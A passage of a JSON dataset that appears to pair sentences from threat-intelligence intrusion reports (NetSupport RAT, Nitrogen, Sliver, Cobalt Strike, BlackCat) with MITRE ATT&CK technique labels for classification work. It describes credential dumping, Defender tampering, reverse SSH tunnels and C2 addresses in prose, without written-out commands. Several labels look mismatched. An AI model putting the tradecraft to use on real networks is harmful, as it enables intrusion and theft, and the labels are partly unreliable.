    "text": "Arctic Wolf also linked the usage of compromised SonicWall credentials to Fog Ransomware.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "NetExec: NetExec is a post-exploitation tool that evolved from CrackMapExec.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "–no_recent: disables the collection of recent files and documents",
    "command": "",
    "labels": [
      "T1074.001"
    ]
  },
  {
    "type": "text",
    "text": "-o <filename>: saves the output into a specific folder.",
    "command": "",
    "labels": [
      "T1074.001"
    ]
  },
  {
    "type": "text",
    "text": "Orpheus: Orpheus is an offensive Python tool designed by Trustedsec based on Impacket’s GetUserSPNs.py and kerberosv5.py.",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "Based on the available .bash_history file, the threat actor only downloaded the tool.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "The tool allows the compromise of unpatched Domain Controllers to obtain Domain Admins privileges in Active Directory environments.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "Integrates with Impacket’s secretsdump.py to extract credentials from the compromised Domain Controller.",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "They leverage the Kerberos Privilege Attribute Certificate (PAC) to potentially impersonate a domain administrator starting from a standard domain account.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "To exploit the previously mentioned vulnerabilities, noPac requires valid domain account credentials which are abused to obtain a Kerberos ticket that can be leveraged to compromise a domain admin.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "NoPac also provides the capability to drop shells and dump hashes.",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "Proxychains: Proxychains is a tool used to route network traffic through proxy servers and it supports multiple types of proxies such as SOCKS4, SOCKS5 and HTTPS.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "Proxychains can be combined with post-exploitation frameworks (e.g., Sliver, Cobalt Strike, etc.) to route the traffic through the implant.",
    "command": "",
    "labels": [
      "T1071.001",
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "The following image shows how the threat actor leveraged proxychains to execute Python scripts like certipy or noPac.py from the command and control server into the target environment.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "The tool is very powerful because a threat actor can execute tools from the command-and-control server leaving less footprint compared to the artifacts that could be left if those were run on a monitored system.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "Sliver: There were two binaries associated with Sliver present on the open directory: slv.bin and sliver-client_linux.",
    "command": "",
    "labels": [
      "T1071.001",
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "We also note in the infrastructure section that this IP address was once observed as a Sliver C2.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "Likely, it was used to connect back to the same Sliver server.",
    "command": "",
    "labels": [
      "T1071.001",
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "The binary sliver-client_linux, is the executable used to connect to a Sliver server, however no further usage of Sliver was observed.",
    "command": "",
    "labels": [
      "T1071.001",
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Powercat is a PowerShell-based networking tool designed to replicate the functionalities provided by Netcat.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "Networking communications since it supports both TCP and UDP connections.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "During this report, we will analyze a case from January 2023 where a NetSupport RAT was utilized to infiltrate a network.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "The RAT was then used for persistence and command & control, resulting in a full domain compromise.",
    "command": "",
    "labels": [
      "T1071.001",
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "The JavaScript code pulled down an obfuscated PowerShell script that was run in memory.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "The PowerShell script was responsible for deploying NetSupport onto the system along with ensuring the script was not running in a sandbox and establishing persistence using registry run keys.",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "Five days after the deployment of NetSupport, the threat actor conducted preliminary reconnaissance by using various Windows utilities like whoami, net, and systeminfo.",
    "command": "",
    "labels": [
      "T1016",
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "This activity was followed several hours later by the installation of an OpenSSH server on the beachhead to facilitate persistence to the machine and network.",
    "command": "",
    "labels": [
      "T1071.001",
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "In order to connect to the OpenSSH server the threat actors established a reverse SSH tunnel from the beachhead to their own server hosted on a VPS provider.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "Using the previously mentioned reverse SSH tunnel to proxy connections through the beachhead host, the threat actors created a connection to the domain controller.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "Eight hours later, the threat actor changed firewall settings on a remote server and then began using Impackets wmiexec.py to engage in further lateral movement.",
    "command": "",
    "labels": [
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "The executed files were also NetSupport malware, however, these were configured to talk to a new command and control server.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "Once running, the threat actor then setup a scheduled task for persistence on these remote hosts.",
    "command": "",
    "labels": [
      "T1053.005",
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "The threat actors returned the next day deploying NetSupport on a domain controller.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "After dumping it, they used 7-zip to compress the files.",
    "command": "",
    "labels": [
      "T1074.001"
    ]
  },
  {
    "type": "text",
    "text": "No specific exfiltration was observed but we assess with medium confidence that this archive was exfiltrated over the network via one of the existing command and control channels.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "They also dropped and ran Pingcastle, an active directory auditing tool.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "While this was running, they used NetSupport to access a backup server to create a new account and add it to the local Administrators and Remote Desktop groups.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "Using that account, they logged in using RDP, proxying the connection from the beachhead host.",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "After logging in, they dropped Netscan and a keygen.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "The threat actor checked on the status of Microsoft Defender and then proceeded to disable it.",
    "command": "",
    "labels": [
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "After disabling the protections, they dropped a renamed ProcDump binary and proceeded to dump LSASS on the domain controller, as well as a backup server.",
    "command": "",
    "labels": [
      "T1003.001",
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "These were then zipped using 7-zip and then likely exfiltrated over existing command and control channels for further review.",
    "command": "",
    "labels": [
      "T1071.001",
      "T1074.001"
    ]
  },
  {
    "type": "text",
    "text": "The threat actor also browsed file shares from the domain controller, opening several sensitive documents.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "Netscan was then moved to the domain controller and executed there.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "The threat actor issued a few more discovery commands using WMI, and then performed some clean up by killing running tasks like Netscan and the ssh proxy.",
    "command": "",
    "labels": [
      "T1047",
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "The final actions observed involved the threat actor dropping two Nim binaries on a domain controller.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "These Nim binaries were then used to attempt to create a backdoor user and elevate them to admin level permissions.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "An earlier sample was documented here using a USPS delivery theme with some overlap in command and control present between the intrusions.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "The NetSupport executable will be added to the Registry Run Key for persistence.",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "In addition, an entry was added to HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run for presentationhost.exe (NetSupport) to facilitate persistence on the machine.",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "The threat actor was observed making use of Batch scripts to automate some of their tasks, such as executing discovery programs, dumping credentials, and establishing persistence.",
    "command": "",
    "labels": [
      "T1059.003",
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "During the beginning stages of the intrusion, the NetSupport deployment script was used to establish persistence using the Run key under the user registry hive.",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "Since the deployment script was PowerShell based, the source process of the registry activity will appear as powershell.exe.",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "Following the previous command, another scheduled task was created to establish a reverse SSH tunnel to the attacker’s server.",
    "command": "",
    "labels": [
      "T1021.001",
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "The entire process related to OpenSSH and its persistence was automated by the threat actors through a script named install.bat.",
    "command": "",
    "labels": [
      "T1053.005",
      "T1059.003",
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "The threat actor created a local user account and added the user to the Administrators and Remote Desktop Users groups.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "Lastly, the threat actor made use of NIM based tools to authenticate via pass-the-hash and to create a new local administrator user.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "We can also see the command that was used to attempt to add the user to the administrators group.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "During this intrusion, the threat actor was primarily concerned with evading detection by Microsoft Defender.",
    "command": "",
    "labels": [
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "This can be seen multiple times throughout the intrusion where the threat actor checked the historical alerts from Defender using powershell Get-MpThreat after conducting credential harvesting or lateral movement actions.",
    "command": "",
    "labels": [
      "T1078",
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "During the intrusion, we observed multiple attempts to add exclusions and ultimately trying to disable the local Defender using below commands.",
    "command": "",
    "labels": [
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "The mpms executable from the above commands was a renamed ProcDump binary.",
    "command": "",
    "labels": [
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "It was likely renamed in an attempt to avoid detection.",
    "command": "",
    "labels": [
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "After some activity, the threat actor entered the ‘Scans’ directory of Microsoft’s Defender software, located under: C:\\ProgramData\\Microsoft\\Windows Defender\\Scans\\History\\",
    "command": "",
    "labels": [
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "In addition to checking the Windows Defender historical scan files, the threat actor once again used the Get-MpThreat Cmdlet to query the history of threats detected by Windows Defender.",
    "command": "",
    "labels": [
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "The threat actor created a scheduled task to run the binary on every logon.",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "As seen in the Defense Evasion section, the actor used the Sysinternals tool ProcDump.",
    "command": "",
    "labels": [
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "The threat actor executed a command to identify the PID of the lsass.exe process.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "This allowed them to target the correct process to dump lsass:",
    "command": "",
    "labels": [
      "T1003.001",
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "It appears this will not work, as there is no directory for the find command, but the actor likely piped it together, as we saw execution of tasklist at the same time:",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "Using the renamed ProcDump utility, the threat actor dumps the lsass.exe process, which can be used to get more credential information:",
    "command": "",
    "labels": [
      "T1003.001",
      "T1055",
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "The attackers executed several familiar discovery commands on the targeted systems.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "These were related to the discovery of information on users, hosts and the network configuration.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "The threat actor connected via the NetSupport agent and then started running commands via a spawned instance of cmd.exe",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "Below are the first batch of executed discovery commands observed.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "As seen during this entire intrusion, the threat actor makes small mistakes, either with typos or in command functionality:",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "However, this account was not activated and the actor tried to enable it, making a few mistakes along the way:",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "We observe a couple of mistakes, as a result of hands-on activity and struggling to get things working:",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "The first cmdkey is actually correct usage, however the account was not activated.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "Using /add requires the usage of domain credentials, not credentials of machine.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "After this endeavor, the threat actor tried elsewhere, looking around for interesting information related to the SYSVOL shares.",
    "command": "",
    "labels": [
      "T1082",
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "Additionally, the actor looked for the presence of SSH.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "This was not installed on the system, so the threat actor installed their own SSH server, as can be seen under the PERSISTENCE section.",
    "command": "",
    "labels": [
      "T1078",
      "T1543.003"
    ]
  },
  {
    "type": "text",
    "text": "Additionally, the threat actor tried his luck to find additional domain controllers:",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "After the Impacket activity, the threat actor returned later to a domain controller and a backup server, where additional tooling was used for discovery.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "The dumping of these logs may have been to review user logon activity across the environment.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "Through this tunnel, the threat actor was able to proxy their access from the beachhead to other assets in the network using a handful of different techniques, including WMI, and RDP.",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "In between executions of atexec, we see Windows Security event logs that match behavior of lateral movement:",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "During the intrusion, the threat actor used SMB to copy files over to other systems.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "Here, the files were not sent over the network in the clear, preventing network inspection, but we were able to inspect the file creation and deletion via event ID 5145 for File Share Auditing event.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "Impacket’s wmiexec tool was used to pivot across the environment, extract the archived file cache.cab, and execute scheduled tasks to run NetSupport RAT on remote systems.",
    "command": "",
    "labels": [
      "T1047",
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "Remote Desktop Protocol (RDP) was used from the beachhead to two servers and two domain controllers on the network.",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "We can verify this activity with Windows Event ID 4624 with logon type 10.",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "This log triggers whenever a user successfully logs on to a computer or server via remote interactive logon (RDP or other remote desktop services).",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "Below illustrates the threat actor initiating RDP sessions from the beachhead to various servers within the network on day eight of this intrusion.",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "During the intrusion, the threat actor revealed two different host names leaked in various Windows Event logs during their RDP sessions.",
    "command": "",
    "labels": [
      "T1021.001",
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "The threat actor was observed connecting to a file server from the Domain Controller and browsing multiple secretive documents on the system.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "As referenced in the Initial Access section, the NetSupport deployment script writes a client32.ini file to the AppData Roaming path, which specifies the primary and secondary gateway.",
    "command": "",
    "labels": [
      "T1053.005",
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "On day five of this intrusion, two scheduled tasks (“SSH Server” and “SSH Key Exchange”) were created on the beachhead to establish a local SSH server running on port 2222 for remote system 185.206.146.129.",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "During the intrusion, we noticed that the threat actors staging data of interest.",
    "command": "",
    "labels": [
      "T1074.001"
    ]
  },
  {
    "type": "text",
    "text": "It is likely that the threat actor exfiltrated the data over the encrypted C2 channel; however, we observed no evidence of this activity.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "The file mf.txt contained all dumped events with event id 4624.",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "This could be analyzed offline to determine possible interesting accounts without actively querying the Active Directory.",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "No specific exfiltration actions were observed, so anything taken was likely moved over existing command and control channels.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "The threat actor also appeared to be interested in some documents, but we only observed opening of those files, not any exfiltration attempts.",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "The threat actor logged in through RDP, attempted to run a Cobalt Strike Beacon, and then dumped memory using ProcDump and Mimikatz.",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "Next, they RDPed into a Domain Controller, minutes before using PsExec to run the NetWalker ransomware payload on all Domain joined systems.",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "The threat actor logged in using the DomainName\\Administrator account.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "c37.ps1 was dropped and run about 16 minutes after initial login.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "Minutes later they ran c37.exe, which copies itself to a temp directory and then stops.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "After further analysis and a comment from @GaborSzappanos, we were able to confirm that both of these are indeed Cobalt Strike and connect to 173.232.146[.]37 over 443.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "The Cobalt Strike server at 173.232.146.37 is using the default cert (146473198) and oddly enough could not be MiTM.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "We attempted to run c37.ps1 and c37.exe in a few sandboxes and none of them captured the network traffic which tells us that these Beacons include sandbox evasion techniques.",
    "command": "",
    "labels": [
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "The c37.exe binary includes shared code from Neshta, poison, BazarBackdoor, XMRig and a large portion from CobaltStrike according to Intezer.",
    "command": "c37.exe",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "AdFind was dropped alongside a script named adf.bat.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "A few minutes after AdFind was run, a command prompt was opened and the following commands were either copy and pasted slowly or manually typed.",
    "command": "",
    "labels": [
      "T1059.003",
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "Shortly after that, a script named pcr.bat was dropped and executed.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "Mimikatz was dropped and then a minute later procdump64.exe was dropped.",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "The threat actors then used Procdump to dump lsass using the following command:",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "Mimikatz was run about a minute later.",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "Shortly after accessing the DC they dropped ip.list.txt, P100119.ps1, and PsExec.",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "Nitrogen was leveraged to deploy Sliver and Cobalt Strike beacons on the beachhead host and perform further malicious actions.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "The two post-exploitation frameworks were loaded in memory through Python scripts.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "After obtaining initial access and establishing further command and control connections, the threat actor enumerated the compromised network with the use of PowerSploit, SharpHound, and native Windows utilities.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "Impacket was employed to move laterally, after harvesting domain credentials.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "The threat actor deployed an opensource backup tool call Restic on a file server to exfiltrate share data to a remote server.",
    "command": "",
    "labels": [
      "T1074.001"
    ]
  },
  {
    "type": "text",
    "text": "Eight days after initial access the threat actor modified a privileged user password and deployed BlackCat ransomware across the domain using PsExec to execute a batch script.",
    "command": "",
    "labels": [
      "T1059.003",
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "About eight minutes after the Nitrogen execution, the attacker initiated hands-on keyboard discovery, utilizing Windows utilities such as net, ipconfig, and nltest.",
    "command": "",
    "labels": [
      "T1016",
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "Two minutes later, additional Sliver beacons were deployed on the compromised host, with persistence established through scheduled tasks and registry key modifications.",
    "command": "",
    "labels": [
      "T1053.005",
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "To deepen their understanding of the environment, the attacker utilized tools such as SharpHound and PowerSploit.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "The Cobalt Strike beacon was then used to dump domain credentials from LSASS, granting the attacker local admin credentials with broad access across the network.",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "Using the stolen credentials, the threat actor leveraged Impacket’s wmiexec to move laterally to a server, where they used curl to download a ZIP file containing their tools.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "After extracting the archive, they repeated the same persistence techniques observed on the beachhead, creating scheduled tasks and modifying registry keys.",
    "command": "",
    "labels": [
      "T1053.005",
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "The attacker then targeted a second server, replicating the same steps to deploy their tools and maintain persistence.",
    "command": "",
    "labels": [
      "T1053.005",
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "Shortly after, a second credential dump was performed, again targeting LSASS memory.",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "Following this, the threat actor began using a domain administrator account, indicating they likely obtained those credentials during this phase.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "The threat actor continued their lateral movement, replicating the same actions on both a file server and a backup server.",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "Approximately six hours after gaining initial access, they deployed the open-source backup tool Restic on the file server.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "No further actions were observed, leading us to assess that this was likely a discovery effort aimed at understanding the backup configurations.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "Next, they ran a batch script on the domain controller using PSEXEC, targeting a privileged backup service account, which changed that accounts credentials.",
    "command": "",
    "labels": [
      "T1059.003",
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "From the staging server, the attacker began distributing the BlackCat ransomware binary across the network using SMB and the Windows copy utility.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "This was followed by executing another batch script via PSEXEC on multiple remote hosts, initiating the ransomware deployment.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "The final script executed a series of actions on remote hosts, including configuring them to start in Safe Mode with Networking and setting a registry run key to launch the ransomware binary upon reboot.",
    "command": "",
    "labels": [
      "T1543.003",
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "Based on threat intelligence sources and the file name, we are highly confident that the threat actors accessed the victim’s infrastructure through a Nitrogen campaign, which delivered a ZIP file via malicious Google ads (i.e., malvertising).",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "a legitimate Python executable named setup.exe which was run by the victim.",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "Upon execution of Setup.exe, the following actions were performed:",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "The hidden python311.dll was loaded (DLL sideloading) and the Nitrogen code was launched.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "The Sliver beacon was executed through a Python script named slv.py which decrypts an AES-encrypted DLL (data.aes) and loads it into memory.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "A few minutes later, the threat actor deployed Python scripts on the beachhead, serving as loaders for both Sliver and Cobalt Strike.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "However, buried within thousands of lines of code was the critical section responsible for executing the Sliver beacon.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "In the first instance, Windows API functions’ addresses are resolved.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Subsequently, the Sliver DLL is injected in memory and the DLL entrypoint is called.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Those debugging strings are the same ones used by Pyramid in the pythonmemorymodule which is a module used to inject and execute DLLs in memory.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "By analyzing the Python.exe process memory, it was possible to notice the DLL injected in the memory sections previously described in the debugging strings.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "The Sliver DLL exports multiple functions, however, StartW is the one to run the beacon.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "wo14.py is another highly obfuscated Python script that acts as a loader for custom shellcode.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "In this specific case, the threat actor specified an AES-encrypted Cobalt Strike shellcode which is:",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Copied into a newly allocated memory region in the Heap.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Executed by invoking the function CreateThread.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "wo12.py has the same behavior.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "The Sysmon Event ID 10 shows the self-injection technique performed by the Python Cobalt Strike loader.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "During the intrusion, the threat actor created multiple scheduled tasks to achieve persistence.",
    "command": "",
    "labels": [
      "T1053.005",
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "While some tasks used the ‘ONSTART’ option to enable persistence after reboot, some used a time frame to execute every 720 minutes.",
    "command": "",
    "labels": [
      "T1053.005",
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "For example, on a server the threat actor dropped a BAT file name UpdateEdge.bat and subsequently created two scheduled tasks using this option.",
    "command": "",
    "labels": [
      "T1053.005",
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "An injected cmd.exe process from the beachhead host opened winlogon.exe with an access mask of 0x143A, which, when decoded, revealed the PROCESS_VM_WRITE permission.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "The cmd.exe process then executed process injection into winlogon.exe.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "All scheduled tasks created by the threat actor were setup to run in SYSTEM context ensuring that access would stay elevated on hosts.",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "Removing hooks from Windows API functions.",
    "command": "",
    "labels": [
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "Bypassing AMSI, WLDP, and ETW.",
    "command": "",
    "labels": [
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "The threat actor was observed injecting into various processes during the intrusion.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Two hours after initial access, the threat actor utilized Cobalt Strike’s credential dumping functionalities to access the LSASS process on the beachhead host.",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "Around two hours after that they landed on a server during lateral movement activity, the threat actor was seen accessing LSASS.",
    "command": "",
    "labels": [
      "T1003.001",
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "On the first day of the intrusion, four hours after the Nitrogen execution, the threat actor started interacting with other systems such as a file server through a Cobalt Strike beacon which was injected into winlogon.exe.",
    "command": "",
